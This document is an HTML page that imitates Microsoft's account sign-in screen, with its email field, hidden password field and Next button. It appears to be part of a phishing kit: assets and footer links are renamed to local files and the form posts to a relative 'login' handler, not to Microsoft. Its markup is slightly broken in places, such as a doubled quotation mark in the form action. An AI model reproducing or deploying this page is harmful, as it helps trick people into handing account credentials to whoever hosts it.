<html dir="ltr" lang="EN-US">
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
      <meta http-equiv="X-UA-Compatible" content="IE=Edge">
      
      <title>Sign in to your Microsoft account</title>
      <meta name="robots" content="none">
		
      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=yes">
      
	   <link rel="stylesheet" type="text/css" href="style.css">


      <link rel="image_src" href="microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg">
   </head>
   <body class="cb" data-bind="defineGlobals: ServerData, bodyCssClass">
      <div>
         <!--  --><!--  --> 
         <div data-bind="component: { name: 'background-image-control', publicMethods: backgroundControlMethods }">
            <div class="background" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
               <!-- ko if: smallImageUrl --> 
               <div data-bind="backgroundImage: smallImageUrl()" style="background-image: url(&quot;0-small_138bcee624fa04ef9b75e86211a9fe0d.jpg&quot;);"></div>
               <!-- /ko --><!-- ko if: backgroundImageUrl --> 
               <div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style="background-image: url(&quot;0_a5dbd4393ff6a725c7e62b61df7e72f0.jpg&quot;);"></div>
               <!-- ko if: useImageMask --><!-- /ko --><!-- /ko --> 
            </div>
         </div>
         <div data-bind="if: activeDialog"></div>
         <form name="f1" id="i0281" novalidate="novalidate" spellcheck="false" method="post" target="_top" autocomplete="off" data-bind="autoSubmit: forceSubmit, attr: { action: postUrl }, ariaHidden: activeDialog" action="login"">
            <!-- ko if: svr.CO --><!-- /ko --><!-- ko withProperties: { '$loginPage': $data } --> 
            <div class="outer" data-bind="component: { name: 'master-page',
               params: {
               serverData: svr,
               showButtons: svr.f,
               showFooterLinks: true,
               useWizardBehavior: svr.BC,
               handleWizardButtons: false,
               password: password,
               hideFromAria: ariaHidden },
               event: {
               footerAgreementClick: footer_agreementClick } }">
               <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } --><!-- ko if: svr.ay --><!-- /ko --> 
               <div class="middle" data-bind="css: { 'app': backgroundLogoUrl }">
                  <!-- ko if: backgroundLogoUrl() && !(paginationControlMethods() && paginationControlMethods().currentViewHasMetadata('hideLogo')) --><!-- /ko --> 
                  <div class="inner fade-in-lightbox" data-bind="
                     animationEnd: paginationControlMethods() &amp;&amp; paginationControlMethods().view_onAnimationEnd,
                     css: {
                     'app': backgroundLogoUrl,
                     'wide': paginationControlMethods() &amp;&amp; paginationControlMethods().currentViewHasMetadata('wide'),
                     'fade-in-lightbox': fadeInLightBox,
                     'has-popup': showFedCredButtons,
                     'transparent-lightbox': backgroundControlMethods() &amp;&amp; backgroundControlMethods().useTransparentLightBox }">
                     <div class="lightbox-cover" data-bind="css: { 'disable-lightbox': svr.bl &amp;&amp; showLightboxProgress() }"></div>
                     <!-- ko if: showLightboxProgress --><!-- /ko --><!-- ko ifnot: paginationControlMethods() && (paginationControlMethods().currentViewHasMetadata('hideLogo')) --> 
                     <div data-bind="component: { name: 'logo-control',
                        params: {
                        isChinaDc: svr.fIsChinaDc,
                        bannerLogoUrl: bannerLogoUrl() } }">

                        <img class="logo" role="img" pngsrc="microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" svgsrc="microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }" src="microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft">
                     </div>
                     <!-- /ko --><!-- ko if: svr.cc && (paginationControlMethods() && !paginationControlMethods().currentViewHasMetadata('hideLwaDisclaimer')) --><!-- /ko --><!-- ko if: asyncInitReady --> 
                     <div role="main" data-bind="component: { name: 'pagination-control',
                        publicMethods: paginationControlMethods,
                        params: {
                        enableCssAnimation: svr.ae,
                        disableAnimationIfAnimationEndUnsupported: svr.bp,
                        initialViewId: initialViewId,
                        currentViewId: currentViewId,
                        initialSharedData: initialSharedData,
                        initialError: $loginPage.getServerError() },
                        event: {
                        cancel: paginationControl_onCancel,
                        showView: $loginPage.view_onShow,
                        setLightBoxFadeIn: view_onSetLightBoxFadeIn,
                        animationStateChange: paginationControl_onAnimationStateChange } }">
                        <!--  --> 
                        <div data-bind="css: { 'zero-opacity': hidePaginatedView() }" class="">
                           <!-- ko if: showIdentityBanner() && (sharedData.displayName || svr.h) --><!-- /ko --> 
                           <div class="pagination-view animate slide-in-next" data-bind="css: {
                              'has-identity-banner': showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.h),
                              'zero-opacity': hidePaginatedView.hideSubView(),
                              'animate': animate(),
                              'slide-out-next': animate.isSlideOutNext(),
                              'slide-in-next': animate.isSlideInNext(),
                              'slide-out-back': animate.isSlideOutBack(),
                              'slide-in-back': animate.isSlideInBack() }">
                              <!-- ko foreach: views --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- ko if: $parent.isViewLoaded --> <!-- ko template: { nodes: [$data], data: $parent } -->
                              <div data-viewid="1" data-showfedcredbutton="true" data-bind="pageViewComponent: { name: 'login-paginated-username-view',
                                 params: {
                                 serverData: svr,
                                 serverError: initialError,
                                 isInitialView: isInitialState,
                                 displayName: sharedData.displayName,
                                 prefillNames: $loginPage.prefillNames,
                                 flowToken: sharedData.flowToken },
                                 event: {
                                 redirect: $loginPage.view_onRedirect,
                                 setPendingRequest: $loginPage.view_onSetPendingRequest,
                                 registerDialog: $loginPage.view_onRegisterDialog,
                                 unregisterDialog: $loginPage.view_onUnregisterDialog,
                                 showDialog: $loginPage.view_onShowDialog } }">
                                 <!--  --> 
                                 <div data-bind="component: { name: 'header-control',
                                    params: {
                                    serverData: svr,
                                    title: str['WF_STR_HeaderDefault_Title'] } }">
                                    <div class="row text-title" id="loginHeader">
                                       <div role="heading" aria-level="1" data-bind="text: title">Sign in</div>
                                       <!-- ko if: isSubtitleVisible --><!-- /ko --> 
                                    </div>
                                 </div>
                                 <!-- ko if: pageDescription && !svr.bt --><!-- /ko --> 
                                 <div class="row">
                                    <div role="alert" aria-live="assertive">
                                       <!-- ko if: usernameTextbox.error --><!-- /ko --> 
                                    </div>
                                    <div class="form-group col-md-24">
                                       <!-- ko if: prefillNames().length > 1 --><!-- /ko --><!-- ko ifnot: prefillNames().length > 1 --> 
                                       <div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox-field',
                                          publicMethods: usernameTextbox.placeholderTextboxMethods,
                                          params: {
                                          serverData: svr,
                                          hintText: tenantBranding.UserIdLabel || str['CT_PWD_STR_Email_Example'],
                                          hintCss: 'placeholder' + (!svr.ab ? ' ltr_override' : '') },
                                          event: {
                                          updateFocus: usernameTextbox.textbox_onUpdateFocus } }">
                                          <!-- ko withProperties: { '$placeholderText': placeholderText } --> <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } --> <input type="email" name="loginfmt" id="i0116" maxlength="113" lang="en" class="form-control ltr_override" aria-required="true" data-bind="
                                             css: { 'has-error': usernameTextbox.error },
                                             ariaLabel: tenantBranding.UserIdLabel || str['CT_PWD_STR_Username_AriaLabel'],
                                             ariaDescribedBy: 'loginHeader' + (pageDescription &amp;&amp; !svr.bt ? ' loginDescription' : ''),
                                             textInput: usernameTextbox.value,
                                             hasFocusEx: usernameTextbox.focused,
                                             placeholder: $placeholderText" aria-label="Enter your email, phone, or Skype." aria-describedby="loginHeader" placeholder="Email, phone, or Skype"> <input name="passwd" type="password" id="i0118" autocomplete="off" data-bind="moveOffScreen, textInput: passwordBrowserPrefill" class="moveOffScreen" tabindex="-1" aria-hidden="true"> <!-- /ko --><!-- /ko --><!-- ko ifnot: usePlaceholderAttribute --><!-- /ko -->
                                       </div>
                                       <!-- /ko --> 
                                    </div>
                                 </div>
                                 <div data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText }" class="position-buttons">
                                    <div class="row">
                                       <div class="col-md-24">
                                          <div class="text-13 action-links">
                                             <!-- ko if: svr.aC && !svr.Aa && !svr.Aj --> 
                                             <div class="form-group" data-bind="
                                                htmlWithBindings: html['WF_STR_SignUpLink_Text'],
                                                childBindings: {
                                                'signup': {
                                                href: svr.H || '#',
                                                ariaLabel: svr.H ? str['WF_STR_SignupLink_AriaLabel_Text'] : str['WF_STR_SignupLink_AriaLabel_Generic_Text'],
                                                click: signup_onClick } }">No account? <a href="" id="signup" aria-label="Create a Microsoft account">Create one!</a></div>
                                             <!-- /ko --><!-- ko if: svr.showCantAccessAccountLink --><!-- /ko --><!-- ko if: showFidoLinkInline && hasFido() && (availableCredsWithoutUsername().length >= 2 || svr.az) --> 
                                             <div class="form-group">
                                                <a id="idA_PWD_SwitchToFido" name="switchToFido" href="#" data-bind="
                                                   text: fidoLinkText,
                                                   click: switchToFidoCredLink_onClick">Sign in with a security key</a><!-- ko component: { name: 'fido-help-button-control',
                                                   params: {
                                                       isPlatformAuthenticatorAvailable: isPlatformAuthenticatorAvailable() },
                                                   event: {
                                                       registerDialog: onRegisterDialog,
                                                       unregisterDialog: onUnregisterDialog,
                                                       showDialog: onShowDialog } } --><!--  --> 
                                                <span class="help-button" role="button" tabindex="0" data-bind="
                                                   click: fidoHelp_onClick,
                                                   pressEnter: fidoHelp_onClick,
                                                   hasFocus: hasFocus,
                                                   ariaLabel: isPlatformAuthenticatorAvailable ? str['CT_STR_CredentialPicker_Help_Desc_Fido'] : str['CT_STR_CredentialPicker_Help_Desc_FidoCrossPlatform']" aria-label="Learn more about signing in with a security key">
                                                   <!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img role="presentation" pngsrc="documentation_bcb4d1dc4eae64f0b2b2538209d8435a.svg" svgsrc="documentation_bcb4d1dc4eae64f0b2b2538209d8435a.svg" data-bind="imgSrc" src="documentation_bcb4d1dc4eae64f0b2b2538209d8435a.svg"><!-- /ko --> <!-- /ko --><!-- /ko --> 
                                                </span>
                                                <div data-bind="component: { name: 'fido-help-dialog-content-control',
                                                   params: {
                                                   isPlatformAuthenticatorAvailable: isPlatformAuthenticatorAvailable },
                                                   event: {
                                                   registerDialog: onRegisterDialog,
                                                   unregisterDialog: onUnregisterDialog } }">
                                                   <!--  --> 
                                                   <div data-bind="component: { name: 'dialog-content-control',
                                                      params: {
                                                      dialogId: 1,
                                                      data: {
                                                      labelledBy: 'fidoDialogTitle',
                                                      describedBy: 'fidoDialogDesc fidoDialogDesc2',
                                                      primaryButtonPreventTabbing: { direction: 'down' },
                                                      isPlatformAuthenticatorAvailable: isPlatformAuthenticatorAvailable } },
                                                      event: {
                                                      registerDialog: onRegisterDialog,
                                                      unregisterDialog: onUnregisterDialog } }">
                                                      <!-- -->
                                                   </div>
                                                </div>
                                                <!-- /ko --> 
                                             </div>
                                             <!-- /ko --><!-- ko if: availableCredsWithoutUsername().length > 0 || svr.az --> 
                                             <div class="form-group" data-bind="
                                                component: { name: 'cred-switch-link-control',
                                                params: {
                                                serverData: svr,
                                                availableCreds: availableCredsWithoutUsername(),
                                                showForgotUsername: svr.az },
                                                event: {
                                                switchView: noUsernameCredSwitchLink_onSwitchView,
                                                redirect: onRedirect,
                                                registerDialog: onRegisterDialog,
                                                unregisterDialog: onUnregisterDialog,
                                                showDialog: onShowDialog } }">
                                                <!--  --> 
                                                <div class="form-group">
                                                   <!-- ko if: credentialCount > 1 || (credentialCount === 1 && (showForgotUsername || selectedCredShownOnlyOnPicker)) --> <a id="idA_PWD_SwitchToCredPicker" href="#" data-bind="
                                                      text: isUserKnown ? str['CT_PWD_STR_SwitchToCredPicker_Link'] : str['CT_PWD_STR_SwitchToCredPicker_Link_NoUser'],
                                                      click: switchToCredPicker_onClick">Sign-in options</a><!-- /ko --><!-- ko if: credentialCount === 1 && !(showForgotUsername || selectedCredShownOnlyOnPicker) --><!-- /ko --><!-- ko if: credentialCount === 0 && showForgotUsername --><!-- /ko --> 
                                                </div>
                                                <!-- ko if: credLinkError --><!-- /ko -->
                                             </div>
                                             <!-- /ko --> 
                                          </div>
                                       </div>
                                    </div>
                                    <div class="row" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }">
                                       <div data-bind="component: { name: 'footer-buttons-field',
                                          params: {
                                          serverData: svr,
                                          isPrimaryButtonEnabled: !isRequestPending(),
                                          isPrimaryButtonVisible: svr.f,
                                          isSecondaryButtonEnabled: true,hidden
                                          isSecondaryButtonVisible: svr.f &amp;&amp; isBackButtonVisible() },
                                          event: {
                                          primaryButtonClick: primaryButton_onClick,
                                          secondaryButtonClick: secondaryButton_onClick } }">
                                          <div class="col-xs-24 no-padding-left-right button-container" data-bind="
                                             visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
                                             css: { 'no-margin-bottom': removeBottomMargin }">
                                             <!-- ko if: isSecondaryButtonVisible --><!-- /ko --> 
                                             <div class="inline-block">
                                                <!-- type="submit" is needed in-addition to 'type' in primaryButtonAttributes observable to support IE8 --> <input type="submit" id="idSIButton9" class="btn btn-block btn-primary" data-bind="
                                                   attr: primaryButtonAttributes,
                                                   value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
                                                   hasFocus: focusOnPrimaryButton,
                                                   click: primaryButton_onClick,
                                                   enable: isPrimaryButtonEnabled,
                                                   visible: isPrimaryButtonVisible,
                                                   preventTabbing: primaryButtonPreventTabbing" value="Next"> 
                                             </div>
                                          </div>
                                       </div>
                                    </div>
                                 </div>
                                 <!-- ko if: tenantBranding.BoilerPlateText --><!-- /ko -->
                              </div>
                              <!-- /ko --><!-- /ko --><!-- ko ifnot: $parent.isViewLoaded --><!-- /ko --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- /ko --> 
                           </div>
                        </div>
                     </div>
                     <!-- /ko --> 
                  </div>
                  <!-- ko if: showDebugDetails --><!-- /ko --><!-- ko if: showFedCredButtons --><!-- /ko --><!-- ko if: newSession --><!-- /ko --> <input type="hidden" name="ps" data-bind="value: postedLoginStateViewId" value=""> <input type="hidden" name="psRNGCDefaultType" data-bind="value: postedLoginStateViewRNGCDefaultType" value=""> <input type="hidden" name="psRNGCEntropy" data-bind="value: postedLoginStateViewRNGCEntropy" value=""> <input type="hidden" name="psRNGCSLK" data-bind="value: postedLoginStateViewRNGCSLK" value=""> <input type="hidden" name="canary" data-bind="value: svr.canary" value=""> <input type="hidden" name="ctx" data-bind="value: ctx" value=""> <input type="hidden" name="hpgrequestid" data-bind="value: svr.sessionId" value=""> <input type="hidden" id="i0327" data-bind="attr: { name: svr.Bt }, value: flowToken" name="PPFT" value="DcvGh7JmuN8BmOvE04RorCfDLWd7sPAlk8qX0uncqOHV5UP*1U7xEEK!fu7jt*Ha6DgE2wuyEgOiESjQwe4Jisw9Br4bMJDAj4L0gAbhE59Rf*o0IpcgxRPfSW1Va!QyJjZxkSG8FJIY7OuPPbynWosdO7jKH5fduYFCy6LNaukiWwrsXQJ8RXchEVpYh6iP6vVdYODl8Bum*J3bC7G3LHcPj2mV9KWwz0sO1hEdz!1Eoy2jYzvN*Fck*0Y6y!ifhjRlASxUvuTREGWr6jXv2Bc$"> <input type="hidden" name="PPSX" data-bind="value: svr.ca" value="Passpor"> <input type="hidden" name="NewUser" value="1"> <input type="hidden" name="FoundMSAs" data-bind="value: svr.AD" value=""> <input type="hidden" name="fspost" data-bind="value: svr.fPOST_ForceSignin ? 1 : 0" value="0"> <input type="hidden" name="i21" data-bind="value: wasLearnMoreShown() ? 1 : 0" value="0"> <input type="hidden" name="CookieDisclosure" data-bind="value: svr.ay ? 1 : 0" value="0"> <input type="hidden" name="IsFidoSupported" data-bind="value: isFidoSupported() ? 1 : 0" value="1"> <input type="hidden" name="isSignupPost" data-bind="value: isSignupPost() ? 1 : 0" value="0"> 
                  <div data-bind="component: { name: 'instrumentation-control',
                     publicMethods: instrumentationMethods,
                     params: { serverData: svr } }"><input type="hidden" name="i2" data-bind="value: clientMode" value="1"> <input type="hidden" name="i17" data-bind="value: srsFailed" value="0"> <input type="hidden" name="i18" data-bind="value: srsSuccess"> <input type="hidden" name="i19" data-bind="value: timeOnPage" value=""></div>
                  <div id="footer" class="footer default" role="contentinfo" data-bind="
                     css: {
                     'default': !backgroundLogoUrl(),
                     'new-background-image': useNewDefaultBackground }">
                     <div data-bind="component: { name: 'footer-control',
                        publicMethods: footerMethods,
                        params: {
                        serverData: svr,
                        useNewDefaultBackground: useNewDefaultBackground(),
                        hasDarkBackground: backgroundLogoUrl(),
                        showLinks: true },
                        event: {
                        agreementClick: footer_agreementClick,
                        showDebugDetails: toggleDebugDetails_onClick } }">
                        <!--  --><!-- ko if: showLinks || impressumLink || showIcpLicense --> 
                        <div id="footerLinks" class="footerNode text-secondary">
                           <a id="ftrTerms" data-bind="text: str['MOBILE_STR_Footer_Terms'], href: termsLink, click: termsLink_onClick" href="microsoft_terms">Terms of use</a> <a id="ftrPrivacy" data-bind="text: str['MOBILE_STR_Footer_Privacy'], href: privacyLink, click: privacyLink_onClick" href="microsoft_privacy">Privacy &amp; cookies</a><!-- ko if: impressumLink --><!-- /ko --><!-- ko if: showIcpLicense --><!-- /ko --><!-- Set attr binding before hasFocusEx to prevent Narrator from losing focus --> 
                           <a id="moreOptions" href="#" role="button" class="moreOptions" data-bind="
                              click: moreInfo_onClick,
                              ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'],
                              attr: { 'aria-expanded': showDebugDetails().toString() },
                              hasFocusEx: focusMoreInfo()" aria-label="Click here for troubleshooting information" aria-expanded="false">
                              <!-- ko component: { name: 'accessible-image-control', params: { hasDarkBackground: !useNewDefaultBackground } } --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --> <!-- ko template: { nodes: [lightImageNode], data: $parent } --><img class="desktopMode" role="presentation" pngsrc="" svgsrc="" data-bind="imgSrc" src="ellipsis_white_5ac590ee72bfe06a7cecfd75b588ad73.svg"><!-- /ko --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme --><!-- /ko --><!-- /ko --><!-- ko component: { name: 'accessible-image-control', params: { hasDarkBackground: hasDarkBackground } } --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="mobileMode" role="presentation" pngsrc="ellipsis_grey_2b5d393db04a5e6e1f739cb266e65b4c.svg" svgsrc="ellipsis_grey_2b5d393db04a5e6e1f739cb266e65b4c.svg" data-bind="imgSrc" src="ellipsis_grey_2b5d393db04a5e6e1f739cb266e65b4c.svg"><!-- /ko --> <!-- /ko --><!-- /ko --> 
                           </a>
                        </div>
                        <!-- /ko -->
                     </div>
                  </div>
               </div>
               <!-- /ko -->
            </div>
            <!-- /ko --> 
         </form>
         <form method="post" aria-hidden="true" target="_top" data-bind="autoSubmit: postRedirectForceSubmit, attr: { action: postRedirectUrl }">
            <!-- ko foreach: postRedirectParams --><!-- /ko --> 
         </form>
         <!-- ko if: svr.bd && !svr.fUseFetchSessionsForDsso --> 
         <div data-bind="component: { name: 'fetch-sessions-control',
            params: {
            serverData: svr,
            sessionPullType: sessionPullType },
            event: {
            updateUserTiles: fetchSessions_onUpdateUserTiles,
            executeGctResult: fetchSessions_onExecuteGctResult,
            incrementAsyncTileRequestCount: fetchSessions_onIncrementAsyncTileRequestCount,
            decrementAsyncTileRequestCount: fetchSessions_onDecrementAsyncTileRequestCount } }">
            <!--  --><!-- ko if: (sessionPullType & 1) != 0 && callMsaStaticMeControl() -->
            <!-- /ko --><!-- ko if: svr.desktopSsoConfig && !isNonInteractiveAuthRequest --><!-- /ko --><!-- ko if: (sessionPullType & 2) != 0 && desktopSsoRunning() --><!-- /ko -->
         </div>
         <!-- /ko --><!-- ko if: svr.AW --> 
         <div id="idPartnerPL" data-bind="injectIframe: { url: svr.AW }"><iframe height="0" width="0" src=""></iframe></div>
         <!-- /ko -->
      </div>
   </body>
</html>


